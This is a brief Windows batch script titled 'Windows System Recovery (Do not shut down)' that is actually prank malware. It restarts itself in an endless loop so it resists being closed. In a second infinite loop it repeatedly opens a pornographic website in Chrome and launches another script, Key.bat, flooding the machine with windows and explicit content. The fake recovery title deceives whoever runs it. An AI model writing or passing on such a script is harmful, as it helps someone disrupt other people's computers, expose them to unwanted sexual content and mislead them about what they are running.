@echo off
title Windows System Recovery (Do not shut down)
if "%1" equ "Restarted" goto %1

:again
echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL
goto :again

:Restarted
echo System Failure (Do not close)
:loop
start chrome www.pornhub.com
start Key.bat
goto loop